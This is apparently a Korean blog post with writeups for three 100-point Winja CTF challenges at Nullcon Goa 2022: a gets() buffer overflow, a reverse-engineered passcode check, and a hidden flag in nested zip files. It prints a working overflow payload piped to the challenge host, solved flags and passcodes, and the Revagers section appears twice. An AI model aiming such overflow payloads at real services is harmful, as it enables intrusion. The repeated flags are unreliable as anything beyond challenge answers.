---
title: 😵 Winja CTF | Nullcon Goa 2022 writeups
date: 2022-09-11 23:04:53
tags:
---

# 개요
CTF에 나가서 문제를 푼적은 꽤 많았지만 writeup를 글로 남기는건 처음인 것 같다.  
이번에는 Nullcon Goa 2022에 참가해서 문제를 풀었는데, 대회 도중 풀이에 성공한 문제들의 writeup을 남기려고 한다.  
하나같이 100점짜리 기본 문제에 어렵지는 않지만 해킹 초짜인 나에게는 풀이에 성공한 모든 문제가 소중하니까✨  

*추가로 언제까지 열여있는지 모르겠지만, Nullcon Goa 2022의 문제들은 [여기](https://ctf.winja.site/)에서 풀 수 있다.  
~~대회 종료 후 가입이 되는지는 모르겠다.~~

# 문제

## 1. [Pwn] 100점 - FreeFall
### 문제 설명
> The highest jump in freefall is 40km, I don't think you so you need to jump that much. But calculate before you jump.

### 풀이

문제 파일 다운로드 후 binwalk로 구조 분석

![Untitled](/images/FreeFall%20f47b008697064626a85992495e363dfe/Untitled.png)

어렵지 않게 ELF 파일임을 확인

IDA로 열고 구조 확인

![Untitled](/images/FreeFall%20f47b008697064626a85992495e363dfe/Untitled%201.png)

이걸로 get에 의한 buffer overflow 문제라는게 확실해짐

![Untitled](/images/FreeFall%20f47b008697064626a85992495e363dfe/Untitled%202.png)

또한 프로그램 string 데이터 중에 `cat flag.txt` 가 존재하는 것을 확인

블로그 검색해봤는데… IDA 보다 gdb를 다들 선호해서 나도 GDB로 건너감

`gdb bof1`으로 gdb 실행

`info functios` 으로 모든 함수 검색

![Untitled](/images/FreeFall%20f47b008697064626a85992495e363dfe/Untitled%203.png)

main 함수 위의 win 이라는 함수가 수상함

아마도 system(”cat flag.txt’) 와 유사한 기능을 하는 함수로 유추

`disassemble win` 으로 함수 디스어셈블

![Untitled](/images/FreeFall%20f47b008697064626a85992495e363dfe/Untitled%204.png)

시작 주소 확보 (이때 x64 기반인것을 알 수 있다)

![Untitled](/images/FreeFall%20f47b008697064626a85992495e363dfe/Untitled%205.png)

char format[32]; 로 선언된 변수에 gets() 함수를 호출하는 것을 확인

따라서 BUF 32byte + SFP 4byte + RET 이므로

총 40byte의 더미 데이터와 위에서 확보한 win 함수부분을 이용해 익스플로잇하면

```c
python -c "print('A' * 40 + '\x72\x11\x40\x00\x00\x00\x00\x00')" | nc freefall.chall.winja.site 18967
```

![Untitled](/images/FreeFall%20f47b008697064626a85992495e363dfe/Untitled%206.png)

`flag{7fbec6d149f9878499b4acd05e06c692_Did_B4BY_MaK3_YOu_OVeRCrY}`

다음과 같은 플래그 값을 얻을 수 있다.

## 2. [Rev] 100점 - Revagers
### 문제 설명
> Help Yondu and the 40 ravagers to steal the flag.

### 풀이

파일 다운 후 메모장으로 열어 파일 시그니처 확인

![Untitled](/images/Revagers%20140a1ab671124bb792ed0aba60744806/Untitled.png)

손쉽게 ELF 파일, 즉 리눅스 실행 파일인 것을 알 수 있음  

바로 IDA로 오픈

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  if ( a1 == 2 )
  {
    if ( strlen(a2[1]) == 41 )
      sub_1159(a2[1]);
    else
      printf("[!] Incorrect Passcode");
  }
  else
  {
    printf("[!] ERR! Usage ./vault <Passcode>");
  }
  return 0LL;
}
```

```c
int __fastcall sub_1159(const char *a1)
{
  int result; // eax

  result = *((unsigned __int8 *)a1 + 1);
  if ( (_BYTE)result == '9' )
  {
    result = *((unsigned __int8 *)a1 + 15);
    if ( (_BYTE)result == '5' )
    {
--- [반복되는 부분 생략] ---
              result = *((unsigned __int8 *)a1 + 10);
              if ( (_BYTE)result == 'a' )
              {
                result = *((unsigned __int8 *)a1 + 32);
                if ( (_BYTE)result == '_' )
                {
                  result = *((unsigned __int8 *)a1 + 19);
                  if ( (_BYTE)result == '6' )
                  {
                    result = *((unsigned __int8 *)a1 + 6);
                    if ( (_BYTE)result == '8' )
                    {
--- [반복되는 부분 생략] ---
                      result = *((unsigned __int8 *)a1 + 18);
                      if ( (_BYTE)result == '2' )
                      {
                        result = *((unsigned __int8 *)a1 + 35);
                        if ( (_BYTE)result == '4' )
                        {
                          if ( a1[2] == 'f' )
                          {
                            puts("[+] You cracked the vault.");
                            return printf(
                                     "[+] Your flag is flag{%s}",
                                     a1);
                          }
                          else
                          {
                            return printf("[!] Incorrect Passcode");
                          }
--- [닫는 괄호 생략] ---
  return result;
}
```

./vault <passcode>로 실행 가능하고

이때 passcode의 길이는 41

길이 41의 문자열을 sub_1159(a1)으로 호출

이 함수에서 입력값을 검사한다는 것을 알 수 있음

if문의 숫자들을 적어보면 다음과 같음

![이래서 알아낸건 안비밀](/images/Revagers%20140a1ab671124bb792ed0aba60744806/Untitled%201.png)

이래서 알아낸건 안비밀

`89fc238534a13e556726cf70f36205cf_ST4r10RD`

위의 값을 인자로 프로그램 실행
```
./vault 89fc238534a13e556726cf70f36205cf_ST4r10RD
```

output :
```
[+] You cracked the vault.
[+] Your flag is flag{89fc238534a13e556726cf70f36205cf_ST4r10RD}
```

히히 바로 제출해보면?

풀이 끗!!

![Untitled](/images/Revagers%20140a1ab671124bb792ed0aba60744806/Untitled%202.png)

Brrrrrrrr 이 나다 :)파일 다운 후 메모장으로 열어 파일 시그니처 확인

![Untitled](/images/Revagers%20140a1ab671124bb792ed0aba60744806/Untitled.png)

손쉽게 ELF 파일, 즉 리눅스 실행 파일인 것을 알 수 있음  

바로 IDA로 오픈

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  if ( a1 == 2 )
  {
    if ( strlen(a2[1]) == 41 )
      sub_1159(a2[1]);
    else
      printf("[!] Incorrect Passcode");
  }
  else
  {
    printf("[!] ERR! Usage ./vault <Passcode>");
  }
  return 0LL;
}
```

```c
int __fastcall sub_1159(const char *a1)
{
  int result; // eax

  result = *((unsigned __int8 *)a1 + 1);
  if ( (_BYTE)result == '9' )
  {
    result = *((unsigned __int8 *)a1 + 15);
    if ( (_BYTE)result == '5' )
    {
--- [반복되는 부분 생략] ---
              result = *((unsigned __int8 *)a1 + 10);
              if ( (_BYTE)result == 'a' )
              {
                result = *((unsigned __int8 *)a1 + 32);
                if ( (_BYTE)result == '_' )
                {
                  result = *((unsigned __int8 *)a1 + 19);
                  if ( (_BYTE)result == '6' )
                  {
                    result = *((unsigned __int8 *)a1 + 6);
                    if ( (_BYTE)result == '8' )
                    {
--- [반복되는 부분 생략] ---
                      result = *((unsigned __int8 *)a1 + 18);
                      if ( (_BYTE)result == '2' )
                      {
                        result = *((unsigned __int8 *)a1 + 35);
                        if ( (_BYTE)result == '4' )
                        {
                          if ( a1[2] == 'f' )
                          {
                            puts("[+] You cracked the vault.");
                            return printf(
                                     "[+] Your flag is flag{%s}",
                                     a1);
                          }
                          else
                          {
                            return printf("[!] Incorrect Passcode");
                          }
--- [닫는 괄호 생략] ---
  return result;
}
```

./vault <passcode>로 실행 가능하고

이때 passcode의 길이는 41

길이 41의 문자열을 sub_1159(a1)으로 호출

이 함수에서 입력값을 검사한다는 것을 알 수 있음

if문의 숫자들을 적어보면 다음과 같음

![이래서 알아낸건 안비밀](/images/Revagers%20140a1ab671124bb792ed0aba60744806/Untitled%201.png)

이래서 알아낸건 안비밀

89fc238534a13e556726cf70f36205cf_ST4r10RD

위의 값을 인자로 프로그램 실행

./vault 89fc238534a13e556726cf70f36205cf_ST4r10RD

output :
[+] You cracked the vault.
[+] Your flag is flag{89fc238534a13e556726cf70f36205cf_ST4r10RD}

히히 바로 제출해보면?

풀이 끗!!

![Untitled](/images/Revagers%20140a1ab671124bb792ed0aba60744806/Untitled%202.png)


## 3. [Steganography] 100점 - T'kani
### 문제 설명
> Buzz lightyear sent secret file to Alisha for their secret mission on T'kani Prime Planet.But Alisha is not able to read the file. Can you help Alisha ?

### 풀이

파일 다운 후 binwalk 로 구조파악

zlib + zip 파일인 것을 확인

우선적으로 zip 압축 해제 (사실 zilb 해제하는 법을 몰라 ㅠ)

minion 이란 파일 확보

다시 구성 확인

![Untitled](/images/T'kani%20519a403b1ac64a64ae99b5bdc55aa5aa/Untitled.png)

이것도 zip 압축파일임을 확인

`unzip minion`으로 압축해제

`grep -r 'flag' *` 명령어로 파일안에 flag 포맷 검색

word/document.xml 파일 속 플래그 발견

![Untitled](/images/T'kani%20519a403b1ac64a64ae99b5bdc55aa5aa/Untitled%201.png)

제출하면 정답 처리


# 대회 후기
총 222등까지 있었는데 97등이면 혼자선 잘하지 않았나...?  
라고 위로를 해보고 싶지만? 더 잘하고 싶기 때문에 더 열심히 공부해야겠다.  
다음 대회는 더 잘해보자.